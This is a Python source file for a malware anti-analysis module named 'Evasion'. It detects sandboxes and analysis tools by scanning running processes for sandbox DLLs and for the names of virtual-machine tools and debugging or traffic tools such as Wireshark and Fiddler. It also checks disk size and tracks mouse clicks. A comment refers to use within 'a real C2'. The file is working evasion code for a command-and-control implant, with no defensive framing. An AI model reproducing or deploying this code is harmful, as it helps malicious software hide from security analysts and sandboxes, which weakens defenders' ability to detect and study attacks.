import time
import sys
import os
import psutil
import platform
from datetime import datetime

try:
    from ctypes.wintypes import HKEY
    from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry, EnumKey, OpenKey, QueryValueEx, CloseKey
    import win32api
    import win32process
    import win32pdh
    from winreg import *
    from ctypes import *
    import ctypes
    WINDOWS_LIBS_AVAILABLE = True
except ImportError:
    WINDOWS_LIBS_AVAILABLE = False

class Evasion:
    def __init__(self):
        pass
        
    def check_all_DLL_names(self):
        if not WINDOWS_LIBS_AVAILABLE:
            return True # Not applicable on non-Windows
        
        SandboxEvidence = []
        sandboxDLLs = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]
        try:
            allPids = win32process.EnumProcesses()
            for pid in allPids:
                try:
                    hProcess = win32api.OpenProcess(0x0410, 0, pid)
                    try:
                        curProcessDLLs = win32process.EnumProcessModules(hProcess)
                        for dll in curProcessDLLs:
                            dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
                            for sandboxDLL in sandboxDLLs:
                                if sandboxDLL in dllName:
                                    if dllName not in SandboxEvidence:
                                        SandboxEvidence.append(dllName)
                    finally:
                        win32api.CloseHandle(hProcess)
                except:
                    pass
        except:
            pass

        if SandboxEvidence:
            return False
        else:
            return True
    
    def check_all_processes_names(self):
        EvidenceOfSandbox = []
        sandboxProcesses = ["vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs"]
        
        try:
            runningProcesses = [p.name() for p in psutil.process_iter()]
            for process in runningProcesses:
                for sandboxProcess in sandboxProcesses:
                    if sandboxProcess in str(process).lower():
                        if process not in EvidenceOfSandbox:
                            EvidenceOfSandbox.append(process)
                            break
        except:
            pass
            
        if not EvidenceOfSandbox:
            return True
        else:
            return False

    def disk_size(self):
        minDiskSizeGB = 50

        if len(sys.argv) > 1:
            try:
                minDiskSizeGB = float(sys.argv[1])
            except ValueError:
                pass

        if platform.system() == "Windows" and WINDOWS_LIBS_AVAILABLE:
            try:
                _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
                diskSizeGB = diskSizeBytes/1073741824
            except:
                diskSizeGB = 100 # Default to true if check fails
        else:
            try:
                st = os.statvfs('/')
                diskSizeGB = (st.f_blocks * st.f_frsize) / 1073741824
            except:
                diskSizeGB = 100

        if diskSizeGB > minDiskSizeGB:
            return True
        else:
            return False

    def click_tracker(self):
        if not WINDOWS_LIBS_AVAILABLE:
            return True # Simplified for Linux
            
        count = 0
        minClicks = 10

        if len(sys.argv) == 2:
            try:
                minClicks = int(sys.argv[1])
            except ValueError:
                pass
                
        # This will block indefinitely if no clicks are detected
        # In a real C2, this might be problematic if running headless
        # For now, we skip if not interactive or on Linux
        if platform.system() != "Windows":
            return True

        start_time = time.time()
        while count < minClicks:
            if time.time() - start_time > 60: # timeout after 60s
                break
            try:
                new_state_left_click = win32api.GetAsyncKeyState(1)
                new_state_right_click = win32api.GetAsyncKeyState(2)

                if new_state_left_click % 2 == 1:
                    count += 1
                if new_state_right_click % 2 == 1:
                    count += 1
            except:
                break
            time.sleep(0.1)

        return True
            
    def main(self):
        # We make it a bit more lenient for Linux for now
        if platform.system() == "Windows":
             return self.disk_size() and self.check_all_processes_names() and self.check_all_DLL_names()
        else:
             return self.disk_size() and self.check_all_processes_names()


def test():
    evasion = Evasion()
    return evasion.main()
